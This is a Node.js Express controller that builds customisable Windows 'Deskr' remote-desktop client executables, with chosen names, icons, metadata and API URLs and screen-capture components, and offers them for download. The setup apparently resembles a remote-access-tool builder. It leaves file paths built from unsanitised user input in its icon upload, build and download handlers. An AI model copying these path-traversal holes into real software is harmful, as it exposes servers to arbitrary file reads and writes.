const { spawn } = require('child_process');
const crypto = require('crypto');
const path = require('path');
const fs = require('fs');
const Build = require('../models/Build');

const BUILD_ENGINE = process.env.BUILD_ENGINE || 'msbuild';
const BUILD_PATH = process.env.BUILD_PATH || process.env.MSBUILD_PATH;
const MINGW_PATH = process.env.MINGW_PATH || 'x86_64-w64-mingw32-g++';
const BUILDER_DIR = path.resolve(__dirname, '../../../builder');

const TEMPLATES = {
    cs: {
        source: path.join(BUILDER_DIR, 'scripts/cs'),
        projectFile: 'client.csproj',
        configFile: 'Helpers/Constants.cs',
        msbuild: {
            outputDir: 'bin/Release',
            outputFile: 'client.exe',
            buildArgs: ['-p:Configuration=Release', '-p:Platform=AnyCPU', '-t:Rebuild'],
            restoreArgs: ['-t:Restore']
        },
        dotnet: {
            outputDir: 'bin/Release/net10.0/win-x64/publish',
            outputFile: 'client.exe',
            buildArgs: ['publish', '--configuration', 'Release', '-r', 'win-x64', '--self-contained', 'true', '/p:PublishSingleFile=true'],
            restoreArgs: ['restore', '-r', 'win-x64']
        }
    },
    cpp: {
        source: path.join(BUILDER_DIR, 'scripts/cpp'),
        projectFile: 'client.vcxproj',
        configFile: 'helpers/constants.h',
        msbuild: {
            outputDir: 'Release',
            outputFile: 'client.exe',
            buildArgs: ['-p:Configuration=Release', '-p:Platform=Win32', '-t:Rebuild'],
            restoreArgs: []
        },
        mingw: {
            outputDir: '.',
            outputFile: 'client.exe',
            sources: [
                'main.cpp',
                'Helpers/system_info.cpp',
                'Services/Connection.cpp',
                'Services/Heartbeat.cpp',
                'Services/ip_service.cpp',
                'Services/ScreenCapture.cpp',
                'network/http_client.cpp'
            ],
            buildArgs: ['-o', 'client.exe', '-std=c++17', '-O2', '-static', '-lwinhttp', '-lwbemuuid', '-lole32', '-loleaut32', '-luuid', '-lgdiplus', '-lgdi32'],
            restoreArgs: []
        }
    }
};


function generateBuildId() {
    return crypto.randomBytes(8).toString('hex');
}

function copyDirSync(src, dest) {
    fs.mkdirSync(dest, { recursive: true });
    const entries = fs.readdirSync(src, { withFileTypes: true });
    for (const entry of entries) {
        const srcPath = path.join(src, entry.name);
        const destPath = path.join(dest, entry.name);
        if (entry.isDirectory()) {
            copyDirSync(srcPath, destPath);
        } else {
            fs.copyFileSync(srcPath, destPath);
        }
    }
}

function injectConfig(filePath, replacements) {
    let content = fs.readFileSync(filePath, 'utf-8');
    for (const [key, value] of Object.entries(replacements)) {
        content = content.replace(key, value);
    }
    fs.writeFileSync(filePath, content);
}

function writeConfigFile(buildId, config) {
    const configPath = path.join(BUILDER_DIR, 'configs', buildId);
    const lines = [
        config.appName || 'DeskrClient',
        config.description || 'Deskr Remote Desktop Client',
        config.copyright || '',
        config.version || '1.0.0',
        config.icon || 'default',
        config.apiUrl || 'http://localhost:8080/api',
        config.language || 'cs'
    ];
    fs.writeFileSync(configPath, lines.join('\n'));
}

exports.uploadIcon = (req, res) => {
    const { id, data } = req.body;
    if (!id || !data) {
        return res.status(400).json({ error: 'Icon id and base64 data are required.' });
    }

    try {
        const buffer = Buffer.from(data, 'base64');
        const iconPath = path.join(BUILDER_DIR, 'icons', `${id}.ico`);
        fs.writeFileSync(iconPath, buffer);
        res.json({ success: true, iconId: id });
    } catch (err) {
        res.status(500).json({ error: 'Failed to save icon.' });
    }
};

exports.startBuild = async (req, res) => {
    const { appName, language, version, description, copyright, icon, apiUrl } = req.body;

    if (!appName || !language) {
        return res.status(400).json({ error: 'appName and language (cs or cpp) are required.' });
    }

    const template = TEMPLATES[language];
    if (!template) {
        return res.status(400).json({ error: 'Invalid language. Use "cs" or "cpp".' });
    }

    const isMingw = language === 'cpp' && BUILD_ENGINE === 'mingw';
    if (!isMingw && !BUILD_PATH) {
        return res.status(500).json({ error: 'Build tool path not configured.' });
    }

    const buildId = generateBuildId();
    const io = req.app.get('io');

    const buildRecord = await Build.create({
        buildId,
        userId: req.user.id,
        appName,
        language,
        version: version || '1.0.0',
        description: description || '',
        apiUrl: apiUrl || '',
        status: 'building'
    });

    res.json({ buildId, message: 'Build started.' });

    io.emit('buildProgress', { buildId, progress: 5, message: 'Preparing build environment...' });

    const buildScriptDir = path.join(BUILDER_DIR, 'scripts', buildId);
    const buildOutputDir = path.join(BUILDER_DIR, 'builds', buildId);

    try {
        copyDirSync(template.source, buildScriptDir);
        fs.mkdirSync(buildOutputDir, { recursive: true });

        io.emit('buildProgress', { buildId, progress: 10, message: 'Injecting configuration...' });

        const configFilePath = path.join(buildScriptDir, template.configFile);
        injectConfig(configFilePath, {
            '%BASE_API%': apiUrl || 'http://localhost:8080/api'
        });

        writeConfigFile(buildId, { appName, description, copyright, version, icon, apiUrl, language });

        if (icon && icon !== 'default') {
            const iconSrc = path.join(BUILDER_DIR, 'icons', `${icon}.ico`);
            if (fs.existsSync(iconSrc)) {
                const iconDest = path.join(buildScriptDir, 'app.ico');
                fs.copyFileSync(iconSrc, iconDest);
            }
        }

        io.emit('buildProgress', { buildId, progress: 15, message: 'Restoring packages...' });

        const engineKey = isMingw ? 'mingw' : BUILD_ENGINE;
        const engineConfig = template[engineKey];
        const projectFilePath = path.join(buildScriptDir, template.projectFile);

        if (engineConfig.restoreArgs.length > 0) {
            const restoreArgs = BUILD_ENGINE === 'msbuild'
                ? [projectFilePath, ...engineConfig.restoreArgs]
                : [...engineConfig.restoreArgs, projectFilePath];
            const restoreProcess = spawn(BUILD_PATH, restoreArgs, { cwd: buildScriptDir });
            await new Promise((resolve) => restoreProcess.on('close', () => resolve()));
        }

        io.emit('buildProgress', { buildId, progress: 20, message: 'Compiling source code...' });

        let buildArgs, buildCommand;
        if (isMingw) {
            buildCommand = MINGW_PATH;
            buildArgs = [...engineConfig.sources, ...engineConfig.buildArgs];
        } else if (BUILD_ENGINE === 'msbuild') {
            buildCommand = BUILD_PATH;
            buildArgs = [projectFilePath, ...engineConfig.buildArgs];
        } else {
            buildCommand = BUILD_PATH;
            buildArgs = [...engineConfig.buildArgs, projectFilePath];
        }
        const buildProcess = spawn(buildCommand, buildArgs, { cwd: buildScriptDir });

        let buildOutput = '';
        let buildErrors = '';

        buildProcess.stdout.on('data', (data) => {
            const text = data.toString();
            buildOutput += text;

            if (text.includes('Compiling') || text.includes('CoreCompile') || text.includes('Csc') || text.includes('ClCompile')) {
                io.emit('buildProgress', { buildId, progress: 40, message: 'Compiling source files...' });
            } else if (text.includes('Link') || text.includes('GenerateTargetFrameworkMonikerAttribute') || text.includes('ResolveAssemblyReference')) {
                io.emit('buildProgress', { buildId, progress: 60, message: 'Linking dependencies...' });
            } else if (text.includes('CopyFilesToOutputDirectory') || text.includes('Copie du fichier') || text.includes('_CopyOutOfDateSourceItemsToOutputDirectory')) {
                io.emit('buildProgress', { buildId, progress: 80, message: 'Copying output files...' });
            }
        });

        buildProcess.stderr.on('data', (data) => {
            buildErrors += data.toString();
        });

        buildProcess.on('close', async (code) => {
            if (code !== 0) {
                try { fs.rmSync(buildScriptDir, { recursive: true, force: true }); } catch (e) { }

                await Build.updateOne({ buildId }, { status: 'failed', error: buildErrors || 'Unknown build error.' });

                io.emit('buildProgress', {
                    buildId,
                    progress: 100,
                    message: 'Build failed.',
                    error: buildErrors || buildOutput.split('\n').filter(l => l.includes('error')).join('\n') || 'Unknown build error.',
                    success: false
                });
                return;
            }

            const outputExe = path.join(buildScriptDir, engineConfig.outputDir, engineConfig.outputFile);
            if (!fs.existsSync(outputExe)) {
                try { fs.rmSync(buildScriptDir, { recursive: true, force: true }); } catch (e) { }

                await Build.updateOne({ buildId }, { status: 'failed', error: 'Executable not found after build.' });

                io.emit('buildProgress', {
                    buildId,
                    progress: 100,
                    message: 'Build succeeded but executable not found.',
                    error: `Expected at: ${outputExe}`,
                    success: false
                });
                return;
            }

            const ext = engineConfig.outputFile.includes('.') ? path.extname(engineConfig.outputFile) : '';
            const finalExe = path.join(buildOutputDir, `${appName}${ext}`);
            fs.copyFileSync(outputExe, finalExe);

            try { fs.rmSync(buildScriptDir, { recursive: true, force: true }); } catch (e) { }

            const stats = fs.statSync(finalExe);

            await Build.updateOne({ buildId }, { status: 'success', fileSize: stats.size });

            io.emit('buildProgress', {
                buildId,
                progress: 100,
                message: 'Build completed successfully!',
                success: true,
                fileSize: stats.size,
                fileName: `${appName}${ext}`
            });
        });

    } catch (err) {
        try { fs.rmSync(buildScriptDir, { recursive: true, force: true }); } catch (e) { }

        await Build.updateOne({ buildId }, { status: 'failed', error: err.message });

        io.emit('buildProgress', {
            buildId,
            progress: 100,
            message: 'Build failed.',
            error: err.message,
            success: false
        });
    }
};

exports.downloadBuild = (req, res) => {
    const { buildId, appName } = req.query;

    if (!buildId || !appName) {
        return res.status(400).json({ error: 'buildId and appName are required.' });
    }

    const filePath = path.join(BUILDER_DIR, 'builds', buildId, `${appName}.exe`);

    if (!fs.existsSync(filePath)) {
        return res.status(404).json({ error: 'Build artifact not found.' });
    }

    res.download(filePath, `${appName}.exe`);
};
